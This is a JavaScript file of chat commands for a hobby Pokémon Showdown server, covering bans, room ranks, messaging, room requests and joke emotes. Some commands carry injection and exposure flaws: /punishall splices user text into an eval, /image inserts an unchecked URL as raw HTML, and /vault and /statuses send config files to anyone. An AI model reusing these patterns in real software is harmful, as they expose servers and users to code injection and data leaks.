                '<font size="1"><b>Money</b>: '+total+'' +
                '<b>Rank</b>: '+group+'<br><br>' +
                '<b>Global Server Status</b>: '+user.status+'<br clear="all">');
                
        },
        status: function (user) {
	    io.stdinString('config/status.csv', user, 'status');
	    if (user.status === '') {
	        user.status = 'This user hasn\'t set their status yet.';
	    }
	    return 'Status: "' + user.status + '"';
	},
	*///
	avatar: function(target, room, user) {
		if (!target) return this.parse('/avatars');
		var parts = target.split(',');
		var avatar = parseInt(parts[0]);
		if (!avatar || avatar > 294 || avatar < 1) {
			if (!parts[1]) {
				this.sendReply("Invalid avatar.");
			}
			return false;
		}

		user.avatar = avatar;
		if (!parts[1]) {
			this.sendReply("Avatar changed to:\n" +
					'|raw|<img src="//play.pokemonshowdown.com/sprites/trainers/'+avatar+'.png" alt="" width="80" height="80" />');
		}
	},

	logout: function(target, room, user) {
		user.resetName();
	},
	
	pb: 'permaban',
	pban: 'permaban',
        permban: 'permaban',
        permaban: function(target, room, user) {
                if (!target) return this.sendReply('/permaban [username] - Permanently bans the user from the server. Bans placed by this command do not reset on server restarts. Requires: & ~');
                if (!this.can('pban')) return false;              
                target = this.splitTarget(target);
                var targetUser = this.targetUser;
                if (!targetUser) {
                        return this.sendReply('User '+this.targetUsername+' not found.');
                }
                if (Users.checkBanned(targetUser.latestIp) && !target && !targetUser.connected) {
                        var problem = ' but was already banned';
                        return this.privateModCommand('('+targetUser.name+' would be banned by '+user.name+problem+'.)');
                }
               
                targetUser.popup(user.name+" has permanently banned you.");
                this.addModCommand(targetUser.name+" was permanently banned by "+user.name+".");
				this.add('|unlink|' + targetUser.userid);
                targetUser.ban();
                ipbans.write('\n'+targetUser.latestIp);
        },
        
	r: 'reply',
	reply: function(target, room, user) {
		if (!target) return this.parse('/help reply');
		if (!user.lastPM) {
			return this.sendReply('No one has PMed you yet.');
		}
		return this.parse('/msg '+(user.lastPM||'')+', '+target);
	},

	pm: 'msg',
	whisper: 'msg',
	w: 'msg',
	msg: function(target, room, user) {
		if (!target) return this.parse('/help msg');
		target = this.splitTarget(target);
		var targetUser = this.targetUser;
		if (!target) {
			this.sendReply('You forgot the comma.');
			return this.parse('/help msg');
		}
		if (!targetUser || !targetUser.connected) {
			if (targetUser && !targetUser.connected) {
				this.popupReply('User '+this.targetUsername+' is offline.');
			} else if (!target) {
				this.popupReply('User '+this.targetUsername+' not found. Did you forget a comma?');
			} else {
				this.popupReply('User '+this.targetUsername+' not found. Did you misspell their name?');
			}
			return this.parse('/help msg');
		}

		if (config.pmmodchat) {
			var userGroup = user.group;
			if (config.groupsranking.indexOf(userGroup) < config.groupsranking.indexOf(config.pmmodchat)) {
				var groupName = config.groups[config.pmmodchat].name;
				if (!groupName) groupName = config.pmmodchat;
				this.popupReply('Because moderated chat is set, you must be of rank ' + groupName +' or higher to PM users.');
				return false;
			}
		}

		if (user.locked && !targetUser.can('lock', user)) {
			return this.popupReply('You can only private message members of the moderation team (users marked by %, @, &, or ~) when locked.');
		}
		if (targetUser.locked && !user.can('lock', targetUser)) {
			return this.popupReply('This user is locked and cannot PM.');
		}
		if (targetUser.ignorePMs && !user.can('lock')) {
			if (!targetUser.can('lock')) {
				return this.popupReply('This user is blocking Private Messages right now.');
			} else if (targetUser.can('hotpatch')) {
				return this.popupReply('This admin is too busy to answer Private Messages right now. Please contact a different staff member.');
			}
		}

		target = this.canTalk(target, null);
		if (!target) return false;

		var message = '|pm|' + user.getIdentity() + '|' + targetUser.getIdentity() + '|' + target;
		user.send(message);
		if (targetUser !== user) {
			if (ShadowBan.isShadowBanned(user)) {
				ShadowBan.room.add('|c|' + user.getIdentity() + "|__(Private to " + targetUser.getIdentity() + ")__ " + target);
			} else {
				targetUser.send(message);
			}
		}
		targetUser.lastPM = user.userid;
		user.lastPM = targetUser.userid;
	},

	blockpm: 'ignorepms',
	blockpms: 'ignorepms',
	ignorepm: 'ignorepms',
	ignorepms: function(target, room, user) {
		if (user.ignorePMs) return this.sendReply('You are already blocking Private Messages!');
		if (user.can('lock') && !user.can('hotpatch')) return this.sendReply('You are not allowed to block Private Messages.');
		user.ignorePMs = true;
		return this.sendReply('You are now blocking Private Messages.');
	},

	unblockpm: 'unignorepms',
	unblockpms: 'unignorepms',
	unignorepm: 'unignorepms',
	unignorepms: function(target, room, user) {
		if (!user.ignorePMs) return this.sendReply('You are not blocking Private Messages!');
		user.ignorePMs = false;
		return this.sendReply('You are no longer blocking Private Messages.');
	},

    	makechatroom: function(target, room, user) {
			if (!this.can('makeroom')) return;
            var id = toId(target);
            if (Rooms.rooms[id]) {
                 return this.sendReply("The room '"+target+"' already exists.");
				}
                if (Rooms.global.addChatRoom(target)) {
					hangman.reset(id);
                    return this.sendReply("The room '"+target+"' was created.");
                }
                return this.sendReply("An error occurred while trying to create the room '"+target+"'.");
        },
        
	dcr:'deregisterchatroom',
	deregisterchatroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		var id = toId(target);
		if (!id) return this.parse('/help deregisterchatroom');
		var targetRoom = Rooms.get(id);
		if (!targetRoom) return this.sendReply("The room '"+id+"' doesn't exist.");
		target = targetRoom.title || targetRoom.id;
		if (Rooms.global.deregisterChatRoom(id)) {
			this.sendReply("The room '"+target+"' was deregistered.");
			this.sendReply("It will be deleted as of the next server restart.");
			return;
		}
		return this.sendReply("The room '"+target+"' isn't registered.");
	},

	privateroom: function(target, room, user) {
		if (!this.can('privateroom', null, room)) return;
		if (target === 'off') {
			delete room.isPrivate;
			this.addModCommand(user.name+' made this room public.');
			if (room.chatRoomData) {
				delete room.chatRoomData.isPrivate;
				Rooms.global.writeChatRoomData();
			}
		} else {
			room.isPrivate = true;
			this.addModCommand(user.name+' made this room private.');
			if (room.chatRoomData) {
				room.chatRoomData.isPrivate = true;
				Rooms.global.writeChatRoomData();
			}
		}
	},

	modjoin: function(target, room, user) {
		if (!this.can('privateroom', null, room)) return;
		if (target === 'off') {
			delete room.modjoin;
			this.addModCommand(user.name+' turned off modjoin.');
			if (room.chatRoomData) {
				delete room.chatRoomData.modjoin;
				Rooms.global.writeChatRoomData();
			}
		} else {
			room.modjoin = true;
			this.addModCommand(user.name+' turned on modjoin.');
			if (room.chatRoomData) {
				room.chatRoomData.modjoin = true;
				Rooms.global.writeChatRoomData();
			}
		}
	},

	officialchatroom: 'officialroom',
	officialroom: function(target, room, user) {
		if (!this.can('makeroom')) return;
		if (!room.chatRoomData) {
			return this.sendReply("/officialroom - This room can't be made official");
		}
		if (target === 'off') {
			delete room.isOfficial;
			this.addModCommand(user.name+' made this chat room unofficial.');
			delete room.chatRoomData.isOfficial;
			Rooms.global.writeChatRoomData();
		} else {
			room.isOfficial = true;
			this.addModCommand(user.name+' made this chat room official.');
			room.chatRoomData.isOfficial = true;
			Rooms.global.writeChatRoomData();
		}
	},

	roomintro: function (target, room, user) {
		if (!target) {
			if (!this.canBroadcast()) return;
			var re = /(https?:\/\/(([-\w\.]+)+(:\d+)?(\/([\w/_\.]*(\?\S+)?)?)?))/g;
			if (!room.introMessage) return this.sendReply("This room does not have an introduction set.");
			this.sendReplyBox(room.introMessage);
			if (!this.broadcasting && user.can('declare', null, room)) {
				this.sendReply('Source:');
				this.sendReplyBox('<code>'+Tools.escapeHTML(room.introMessage)+'</code>');
			}
			return;
		}
		if (!this.can('declare', null, room)) return false;
		if (!this.canHTML(target)) return;
		if (!/</.test(target)) {
			// not HTML, do some simple URL linking
			var re = /(https?:\/\/(([-\w\.]+)+(:\d+)?(\/([\w/_\.]*(\?\S+)?)?)?))/g;
			target = target.replace(re, '<a href="$1">$1</a>');
		}

		if (!target.trim()) target = '';
		room.introMessage = target;
		this.sendReply("(The room introduction has been changed to:)");
		this.sendReplyBox(target);

		if (room.chatRoomData) {
			room.chatRoomData.introMessage = room.introMessage;
			Rooms.global.writeChatRoomData();
		}
	},

	roomowner: function (target, room, user) {
		if (!room.chatRoomData) {
			return this.sendReply("/roomowner - This room isn't designed for per-room moderation to be added");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");
		
		if (!room.founder) return this.sendReply('The room needs a room founder before it can have a room owner.');
		if (room.founder != user.userid && !this.can('makeroom')) return this.sendReply('/roomowner - Access denied.');

		if (!room.auth) room.auth = room.chatRoomData.auth = {};

		var name = targetUser.name;

		room.auth[targetUser.userid] = '#';
		this.addModCommand(''+name+' was appointed Room Owner by '+user.name+'.');
		room.onUpdateIdentity(targetUser);
		Rooms.global.writeChatRoomData();
	},

	roomdeowner: 'deroomowner',
	deroomowner: function(target, room, user) {
		if (!room.auth) {
			return this.sendReply("/roomdeowner - This room isn't designed for per-room moderation");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '#') return this.sendReply("User '"+name+"' is not a room owner.");
		if (!room.founder || user.userid != room.founder && !this.can('makeroom')) return false;


		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Owner.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},
	
	roomadmin: function(target, room, user) {
		if (!room.chatRoomData) {
			return this.sendReply("/roomadmin - This room isn't designed for per-room moderation to be added");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;

		if (!targetUser) return this.sendReply("User '"+this.targetUsername+"' is not online.");

		if (!this.can('makeroom', targetUser, room)) return false;

		if (!room.auth) room.auth = room.chatRoomData.auth = {};

		var name = targetUser.name;

		room.auth[targetUser.userid] = '~';
		this.addModCommand(''+name+' was appointed Room Administrator by '+user.name+'.');
		room.onUpdateIdentity(targetUser);
		Rooms.global.writeChatRoomData();
	},
	
	roomdeadmin: 'deroomadmin',
	deroomadmin: function(target, room, user) {
		if (!room.auth) {
			return this.sendReply("/roomdeadmin - This room isn't designed for per-room moderation");
		}
		var target = this.splitTarget(target, true);
		var targetUser = this.targetUser;
		var name = this.targetUsername;
		var userid = toId(name);
		if (!userid || userid === '') return this.sendReply("User '"+name+"' does not exist.");

		if (room.auth[userid] !== '~') return this.sendReply("User '"+name+"' is not a room admin.");
		if (!this.can('makeroom', null, room)) return false;

		delete room.auth[userid];
		this.sendReply('('+name+' is no longer Room Administrator.)');
		if (targetUser) targetUser.updateIdentity();
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},
	
	roomdesc: function(target, room, user) {
		if (!target) {
			if (!this.canBroadcast()) return;
			var re = /(https?:\/\/(([-\w\.]+)+(:\d+)?(\/([\w/_\.]*(\?\S+)?)?)?))/g;
			if (!room.desc) return this.sendReply("This room does not have a description set.");
			this.sendReplyBox('The room description is: '+room.desc.replace(re, "<a href=\"$1\">$1</a>"));
			return;
		}
		if (!this.can('roommod', null, room)) return false;
		if (target.length > 80) {
			return this.sendReply('Error: Room description is too long (must be at most 80 characters).');
		}

		room.desc = target;
		this.sendReply('(The room description is now: '+target+')');

		if (room.chatRoomData) {
			room.chatRoomData.desc = room.desc;
			Rooms.global.writeChatRoomData();
		}
	},
	
		
    	roomdemote: 'roompromote',
    	roompromote: function(target, room, user, connection, cmd) {
        if (!room.auth) {
        	this.sendReply("/roompromote - This room isn't designed for per-room moderation");
            	return this.sendReply("Before setting room mods, you need to set it up with /roomowner");
        }
        if (!target) return this.parse('/help roompromote');

        var target = this.splitTarget(target, true);
        var targetUser = this.targetUser;
        var userid = toId(this.targetUsername);
        var name = targetUser ? targetUser.name : this.targetUsername;

        if (!userid) {
            if (target && config.groups[target]) {
                var groupid = config.groups[target].id;
                return this.sendReply("/room"+groupid+" [username] - Promote a user to "+groupid+" in this room only");
            }
            return this.parse("/help roompromote");
        }
        var currentGroup = (room.auth[userid] || ' ');
        if (!targetUser && !room.auth[userid]) {
            return this.sendReply("User '"+this.targetUsername+"' is offline and unauthed, and so can't be promoted.");
        }

        var nextGroup = target || Users.getNextGroupSymbol(currentGroup, cmd === 'roomdemote', true);
        if (target === 'deauth') nextGroup = config.groupsranking[0];
        if (!config.groups[nextGroup]) {
            return this.sendReply('Group \'' + nextGroup + '\' does not exist.');
        }
        if (config.groups[nextGroup].globalonly) {
            return this.sendReply('Group \'room' + config.groups[nextGroup].id + '\' does not exist as a room rank.');
        }
        if (currentGroup !== ' ' && !user.can('room'+config.groups[currentGroup].id, null, room)) {
            return this.sendReply('/' + cmd + ' - Access denied for promoting from '+config.groups[currentGroup].name+'.');
        }
        if (nextGroup !== ' ' && !user.can('room'+config.groups[nextGroup].id, null, room)) {
            return this.sendReply('/' + cmd + ' - Access denied for promoting to '+config.groups[nextGroup].name+'.');
        }
        if (currentGroup === nextGroup) {
            return this.sendReply("User '"+this.targetUsername+"' is already a "+(config.groups[nextGroup].name || 'regular user')+" in this room.");
        }
        if (config.groups[nextGroup].globalonly) {
            return this.sendReply("The rank of "+config.groups[nextGroup].name+" is global-only and can't be room-promoted to.");
        }

        var isDemotion = (config.groups[nextGroup].rank < config.groups[currentGroup].rank);
        var groupName = (config.groups[nextGroup].name || nextGroup || '').trim() || 'a regular user';

        if (nextGroup === ' ') {
            delete room.auth[userid];
        } else {
            room.auth[userid] = nextGroup;
        }

        if (isDemotion) {
            this.privateModCommand('('+name+' was appointed to Room ' + groupName + ' by '+user.name+'.)');
            if (targetUser) {
                targetUser.popup('You were appointed to Room ' + groupName + ' by ' + user.name + '.');
            }
        } else {
            this.addModCommand(''+name+' was appointed to Room ' + groupName + ' by '+user.name+'.');
        }
        if (targetUser) {
            targetUser.updateIdentity();
        }
        if (room.chatRoomData) {
            Rooms.global.writeChatRoomData();
        }
    	},

	rk: 'rkick',
	rkick: function(target, room, user){
		if(!room.auth) return this.sendReply('/rkick is designed for rooms with their own auth.');
		if(!this.can('roommod', null, room)) return this.sendReply('/rkick - Access Denied.');
		var targetUser = Users.get(target);
		if(targetUser == undefined) return this.sendReply('User not found.');
		targetUser.popup('You have been kicked from room '+ room.title + '.');
		targetUser.leaveRoom(room);
		room.add('|raw|'+ targetUser.name + ' has been kicked from room by '+ user.name + '.');
		this.logModCommand(targetUser.name + ' has been kicked from room by '+ user.name + '.');
	},
	 
	s: 'spank',
	spank: function(target, room, user){
                if(!target) return this.sendReply('/spank needs a target.');
                return this.parse('/me spanks ' + target +'!');
    	},
    	report: 'complain',
	complain: function(target, room, user){
        if (!target) return this.sendReply('/report [report] - Use this command to report other users.');
        var html = ['<img ','<a href','<font ','<marquee','<blink','<center'];
        for (var x in html) {
        	if (target.indexOf(html[x]) > -1) return this.sendReply('HTML is not supported in this command.');
        }
   
        if (target.indexOf('panpawn sucks') > -1) return this.sendReply('Yes, we know.');
        if (target.length > 350) return this.sendReply('This report is too long; it cannot exceed 350 characters.');
        if (!this.canTalk()) return;
        Rooms.rooms.staff.add(user.userid+' (in '+room.id+') has reported: '+target+'');
        this.sendReply('Your report "'+target+'" has been reported.');
        for(var u in Users.users)
                if((Users.users[u].group == "~" || Users.users[u].group == "&" || Users.users[u].group == "@" || Users.users[u].group == "%")&& Users.users[u].connected)
                        Users.users[u].send('|pm|~Server|'+Users.users[u].getIdentity()+'|'+user.userid+' (in '+room.id+') has reported: '+target+'');
	},
	suggestion: 'suggest',
	suggest: function(target, room, user){
        if (!target) return this.sendReply('/suggest [suggestion] - Sends your suggestion to staff to review.');
         var html = ['<img ','<a href','<font ','<marquee','<blink','<center'];
        for (var x in html) {
        	if (target.indexOf(html[x]) > -1) return this.sendReply('HTML is not supported in this command.');
        }
       
        if (target.length > 450) return this.sendReply('This suggestion is too long; it cannot exceed 450 characters.');
        if (!this.canTalk()) return;
        Rooms.rooms.staff.add(user.userid+' (in '+room.id+') has suggested: '+target+'');
        this.sendReply('Thanks, your suggestion "'+target+'" has been sent.  We\'ll review your feedback soon.');
	},
//New Room Commands
	newroomcommands:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('<b>New Room Commands</b><br>' +
                	'-/newroomfaq - Shows an FAQ for making a new room.<br>' +
                	'-/newroomquestions - A command with a list of questions for a future room founder to answer.<br>' +
			'-/newroom - A command a future room founder will use to answer /newroomquestion\'s questions.<br>' +
			'-/roomreply [user] - Denies a user of a room. Requires &, ~.');
	},
	
	newroomfaq:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('So, you\'re interested in making a new room on Gold, aye? Well, the process is rather simple, really! Do /newroomquestions and answer those questions with your answers and staff will review them to consider making your room!');
	},

	newroomquestions:function(target, room, user) {
                if (!this.canBroadcast()) return;
                this.sendReplyBox('<b>New Room Questions:</b><br>' +
                	'Directions: Using the "/newroom" command, answer the following and <i>number</i> your answers on one line.<br>' +
                	'1. Prefered room name?<br>' +
                	'2. Is this a new room, or does it already have an established user base to it that will follow it here?<br>' +
                	'3. How many new users do you honestly think it will attract to the server?<br>' +
                	'4. Are you willing to enforce the <a href="http://goldserver.weebly.com/rules.html">servers rules</a> as well as your room\'s rules in your room?<br>' +
                	'5. Do you have a website for your room? If not, do you plan to create one?<br>' +
                	'6. What makes your room different than all the others?<br><br>' +
                	'<b>Things to Note:</b><br>'+
                	'-Even if you do get a room on Gold, if it isn\'t active or you or your members make a severe offense against our rules than we have a right to delete it.  After all, owning any room is a responsibility and a privilege, not a right.<br>' +
                	'-If your room is successful and active on the server for a months time, it will qualify for a welcome message when users join the room!<br>' +
                	'-Remember, you get global voice by contributing to the server; so if your room is successful for a while, that is contribution to the server and you *could* get global voice as a result!');
	},
	
	newroom: function(target, room, user){
        if (!target) return this.sendReply('/newroom [answers to /newroomquestions] - Requests a new chat room to be be created.');
        var html = ['<img ','<a href','<font ','<marquee','<blink','<center'];
        for (var x in html) {
        	if (target.indexOf(html[x]) > -1) return this.sendReply('HTML is not supported in this command.');
        }
        if (target.length > 550) return this.sendReply('This new room suggestion is too long; it cannot exceed 550 characters.');
        if (target.length < 20) return this.sendReply('This room suggestion is rather small; are you sure that you answered all of the questions from /newroomquestions?');
        if (!this.canTalk()) return;
        Rooms.rooms.staff.add('|html|<font size="4"><b>New Room Suggestion Submitted!</b></font><br><b>Suggested by:</b> '+user.userid+'<br><b>Suggestion</b> <i>(see /newroomquestions)</i>:<br> '+target+'');
        Rooms.rooms.room.add('|html|<font size="4"><b>New Room Suggestion Submitted!</b></font><br><b>Suggested by:</b> '+user.userid+'<br><b>Suggestion</b> <i>(see /newroomquestions)</i>:<br> '+target+'');
        this.sendReply('Thanks, your new room suggestion has been sent.  We\'ll review your feedback soon and get back to you. ("'+target+'")');
	      
       for (var u in Users.users) { if (Users.users[u].isStaff) {
         Users.users[u].send('|pm|~Staff PM|'+Users.users[u].group+Users.users[u].name+'|Attention: "'+user.userid+'" has submitted a **new room suggestion**. Please see staff room.'); } 
		}
	},
	
	roomreply: function(target, room, user) {
		if (!target) return this.sendReply('/roomreply [user] - Denies a user of their recent room request.');
		if (!this.can('pban')) return false;
		target = this.splitTarget(target);
		targetUser = this.targetUser;
		if (!targetUser) {
			return this.sendReply('The user '+this.targetUsername+' is not online.');
		}
		
		Rooms.rooms.staff.add('|html|<b>'+targetUser+'</b>\'s room request has been <font color="red">denied</font> by '+user.userid+'.');
		Rooms.rooms.room.add('|html|<b>'+targetUser+'</b>\'s room request has been <font color="red">denied</font> by '+user.userid+'.');	

		targetUser.send('|pm|~Room Request|'+targetUser+'|Hello, "'+targetUser+'".  Sorry, your recent room request has been denied by the staff.  However, you may submit another application to request a new room at any time. The reason why your room was denied was because we did\'t see a point for it on the server.  Best of luck.  Regards, Gold Staff.');
		
			
	},
//End new room commands
	punishall: 'pa',
	pa: function(target, room, user){
                if(!target) return this.sendReply('/punishall [lock, mute, unmute, ban]. - Requires eval access.');
				if (target.indexOf('ban ') > -1) {
				return this.sendReply('Wow.  Congrats, you actually have some balls, kupo.')
				}
				if (target.indexOf('ban') > -1) {
				return this.sendReply('Wow.  Congrats, you actually have some balls, kupo.')
				}
				if (target.indexOf(' ban') > -1) {
				return this.sendReply('Wow.  Congrats, you actually have some balls, kupo.')
				}
				if (target.indexOf('lock') > -1) {
				return this.sendReply('Wow.  Congrats, you actually have some balls, kupo.')
				}
				if (target.indexOf('lock ') > -1) {
				return this.sendReply('Wow.  Congrats, you actually have some balls, kupo.')
				}
                return this.parse('/eval for(var u in Users.users) Users.users[u].'+target+'()');
	},
	
	nc: function(room, user, cmd){
		user.nctimes += 1;
        	if(user.nctimes > 3) return this.sendReply('You have used /nc too many times');
                return this.parse('**Panpawn is my god!** I shall forever praises oh holy god, panpawn!');
	},
	
	star: function(room, user, cmd){
                return this.parse('/hide Ã¢Ëœâ€¦');
	},
	
	tpolltest: 'tierpoll',
	tpoll: 'tierpoll',
	tierpoll: function(room, user, cmd){
                return this.parse('/poll Next Tournament Tier:, other, rubeta, randomdoubles, custom, reg1v1, lc, nu, cap, cc, oumono, ubersmono, randomsmono, uumono, rumono, numono, lcmono, doubles, balhackmons, hackmons, ubers, randombat, ou, cc1v1, uu');
	},
	
	hv: 'helpvotes',
	helpvotes: function(room, user, cmd){
                return this.parse('/wall Remember to **vote** even if you don\'t want to battle; that way you\'re still voting for what tier battles you want to watch!');	
	},
	
	hc: function(room, user, cmd){
                return this.parse('/hotpatch chat');
	},
	
	def: function(target, room, user){
	 if(!target) return this.sendReply('/def [word] - Will bring you to a search to define the targeted word.');
                return this.parse('[[define '+target+']]');
	},
	
	cc1v1: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox(
			'<center><button name="send" value="/challenge ponybot, challengecup1vs1" class="blackbutton" title="Challenge Cup 1vs1 Battle!"><font size="white">Click here for a CC1vs1 battle!'
			);
	},
	
	authlist: 'viewserverauth',
	viewserverauth: function(target, room, user, connection) {
        var buffer = [];
        var admins = [];
        var leaders = [];
        var mods = [];
        var drivers = [];
        var voices = [];
        
        admins2 = ''; leaders2 = ''; mods2 = ''; drivers2 = ''; voices2 = ''; 
        stafflist = fs.readFileSync('config/usergroups.csv','utf8');
        stafflist = stafflist.split('\n');
        for (var u in stafflist) {
            line = stafflist[u].split(',');
			if (line[1] == '~') { 
                admins2 = admins2 +line[0]+',';
            } 
            if (line[1] == '&') { 
                leaders2 = leaders2 +line[0]+',';
            }
            if (line[1] == '@') { 
                mods2 = mods2 +line[0]+',';
            } 
            if (line[1] == '%') { 
                drivers2 = drivers2 +line[0]+',';
            } 
            if (line[1] == '+') { 
                voices2 = voices2 +line[0]+',';
             } 
        }
        admins2 = admins2.split(',');
        leaders2 = leaders2.split(',');
        mods2 = mods2.split(',');
        drivers2 = drivers2.split(',');
        voices2 = voices2.split(',');
        for (var u in admins2) {
            if (admins2[u] != '') admins.push(admins2[u]);
        }
        for (var u in leaders2) {
            if (leaders2[u] != '') leaders.push(leaders2[u]);
        }
        for (var u in mods2) {
            if (mods2[u] != '') mods.push(mods2[u]);
        }
        for (var u in drivers2) {
            if (drivers2[u] != '') drivers.push(drivers2[u]);
        }
        for (var u in voices2) {
            if (voices2[u] != '') voices.push(voices2[u]);
        }
        if (admins.length > 0) {
            admins = admins.join(', ');
        }
        if (leaders.length > 0) {
            leaders = leaders.join(', ');
        }
        if (mods.length > 0) {
            mods = mods.join(', ');
        }
        if (drivers.length > 0) {
            drivers = drivers.join(', ');
        }
        if (voices.length > 0) {
            voices = voices.join(', ');
        }
        connection.popup('Gold Staff list \n\n**Administrators**: \n'+admins+'\n**Leaders**: \n'+leaders+'\n**Moderators**: \n'+mods+'\n**Drivers**: \n'+drivers+'\n**Voices**: \n'+voices);    
	},
	
	css: function(target, room, user, connection) {
                var css = fs.readFileSync('config/custom.css','utf8');
                return user.send('|popup|'+css);
	},
	
	pbl: 'pbanlist',
	permabanlist: 'pbanlist',
	pbanlist: function(target, room, user, connection) {
		if(!this.canBroadcast()|| !user.can('lock')) return this.sendReply('/pbanlist - Access Denied.');
                var pban = fs.readFileSync('config/pbanlist.txt','utf8');
                return user.send('|popup|'+pban);
	},
	
	vault: function(target, room, user, connection) {
		
                var money = fs.readFileSync('config/money.csv','utf8');
                return user.send('|popup|'+money);
	},
	
	statuses: function(target, room, user, connection) {
		
                var money = fs.readFileSync('config/status.csv','utf8');
                return user.send('|popup|'+money);
	},
	
	adminremind: 'aremind',
	aremind: function(target, room, user, connection) {
		if(!this.canBroadcast()|| !user.can('hotpatch')) return this.sendReply('/adminremind - Access Denied.');
                var aremind = fs.readFileSync('config/adminreminders.txt','utf8');
                return user.send('|popup|'+aremind);
	},
	
	sremind: 'sreminder',
	sreminder: function(target, room, user) {
		if (!this.canBroadcast()) return;
		this.sendReplyBox('<div class="broadcast-gold" border="5"><center><img src="http://media.tumblr.com/e40eb84460e150c6b8d51b49607574f5/tumblr_inline_mjrw7vcVu51qz4rgp.gif" border="5" title="Welcome to Gold!"></center><br />' +
                                        '<center><b><font size="4">Welcome to Gold!</b></font><br>' +
                                        '-<em>Stay gold, ponyboy~ :^)</em></center><br>' +
                                        '<b>1.</b> If you should have any questions or concerns while you\'re here, than please feel free to PM a server staff member, a: Driver (%), Moderator (@), Leader (&), or, if it\'s very serious, an Administrator (~).<br>' +
                                        '<b>2.</b> Do /events for a list of events that we do here!<br>' +
                                        '<b>3.</b> Advertising another server is an automatic lock by PM or in chat.<br>' +
                                        '<b>4.</b> Like this server and want to help keep it running? If so, you can <a href="https://www.paypal.com/cgi-bin/webscr?cmd=_donations&business=FBZBA7MJNMG7J&lc=US&item_name=Gold%20Server&currency_code=USD&bn=PP%2dDonationsBF%3abtn_donate_LG%2egif%3aNonHosted">donate</a>!  Do /donate for more information.<br />' +
                                        '<b>5.</b> We hope you have fun while you\'re here! If so, then please be sure to tell your friends about us!<br>' +
                                        '<hr width="85%">' +
                                        '<center><a href="http://goldserver.weebly.com/rules"><button class="blackbutton" title="Rules"><font color="white"><b>Rules</b></a></button>   |   <a href="http://goldserver.weebly.com/news"><button class="blackbutton" title="News"><font color="white"><b>News</b></a></button>   |   <a href="http://goldserver.weebly.com/"><button class="blackbutton" title="Website"><font color="white"><b>Website</b></a></button>   |   <a href="http://goldserver.weebly.com/faqs"><button class="blackbutton" title="FAQs"><font color="white"><b>FAQs</b></a></button>   |   <a href="http://plug.dj/gold-server/"><button class="blackbutton" title="Plug.dj"><font color="white"><b>Plug.dj</b></a></button>   |   <button name="send" value="/shop164" class="blackbutton" title="Shop"><font color="white"><b>Shop</button></div>');
        },
        
	pic: 'image',
	image: function(target, room, user){
				if(!target) return this.sendReply('/image [url] - Shows an image using /a. Requires ~.');
                return this.parse('/a |raw|<center><img src="'+target+'">');
	},
	
	dk: 'dropkick',
	dropkick: function(target, room, user){
                if(!target) return this.sendReply('/dropkick needs a target.');
                return this.parse('/me dropkicks ' + target + ' across the PokÃƒÂ©mon Stadium!');
	},
	
	givesymbol: 'gs',
	gs: function(target, room, user){
                if(!target) return this.sendReply('/givesymbol [user] - Gives permission for this user to set a custom symbol.');
                return this.parse('/gi '+target+', symbol');
	},
	
	halloween: function(target, room, user){
                if(!target) return this.sendReply('/halloween needs a target.');
                return this.parse('/me takes ' + target +'`s pumpkin and smashes it all over the PokÃƒÂ©mon Stadium!');
	},
	
	barn: function(target, room, user){
                if(!target) return this.sendReply('/barn needs a target.');
                return this.parse('/me has barned ' + target + ' from the entire server!');
	},
	
	lick: function(target, room, user){
                if(!target) return this.sendReply('/lick needs a target.');
                return this.parse('/me licks ' + target +' excessivley!');
	},
/*
	adultroom: function(target, room, user) {
		if(!user.can('makeroom')) return;
		if(target === 'off'){
			room.isAdult = false;
			return this.addModCommand(user.name + ' has made the room available to everyone.');
		} else {
			room.isAdult = true;
			return this.addModCommand(user.name + ' has made the room available to adults.');
		}
	},

	roomvoice: function(target, room, user) {
		if (nextGroup !== ' ' && !user.can('room'+config.groups[nextGroup].id, null, room)) {
			return this.sendReply('/' + cmd + ' - Access denied for promoting to '+config.groups[nextGroup].name+'.');
		}
		if (currentGroup === nextGroup) {
			return this.sendReply("User '"+this.targetUsername+"' is already a "+(config.groups[nextGroup].name || 'regular user')+" in this room.");
		}
		if (config.groups[nextGroup].globalonly) {
			return this.sendReply("The rank of "+config.groups[nextGroup].name+" is global-only and can't be room-promoted to.");
		}

		var isDemotion = (config.groups[nextGroup].rank < config.groups[currentGroup].rank);
		var groupName = (config.groups[nextGroup].name || nextGroup || '').trim() || 'a regular user';

		if (nextGroup === ' ') {
			delete room.auth[userid];
		} else {
			room.auth[userid] = nextGroup;
		}

		if (isDemotion) {
			this.privateModCommand('('+name+' was appointed to Room ' + groupName + ' by '+user.name+'.)');
			if (targetUser) {
				targetUser.popup('You were appointed to Room ' + groupName + ' by ' + user.name + '.');
			}
		} else {
			this.addModCommand(''+name+' was appointed to Room ' + groupName + ' by '+user.name+'.');
		}
		if (targetUser) {
			targetUser.updateIdentity();
		}
		if (room.chatRoomData) {
			Rooms.global.writeChatRoomData();
		}
	},
*/
	autojoin: function(target, room, user, connection) {
		Rooms.global.autojoinRooms(user, connection);
	},

	join: function(target, room, user, connection) {
		if (!target) return false;
		var targetRoom = Rooms.get(target) || Rooms.get(toId(target));
		if (targetRoom === 'logroom' && user.group !== '~') return false;
		if (targetRoom === 'adminroom' && user.group !== '~') return false;
		if (targetRoom === 'spamroom' && user.group !== '~') return false;
		if (!targetRoom) {
		if (target === 'lobby') return connection.sendTo(target, "|noinit|nonexistent|");
			return connection.sendTo(target, "|noinit|nonexistent|The room '"+target+"' does not exist.");
		}
		if (targetRoom.isPrivate) {
			if (targetRoom.modjoin) {
				var userGroup = user.group;
				if (targetRoom.auth) {
					userGroup = targetRoom.auth[user.userid] || ' ';
				}
				if (config.groupsranking.indexOf(userGroup) < config.groupsranking.indexOf(targetRoom.modchat)) {
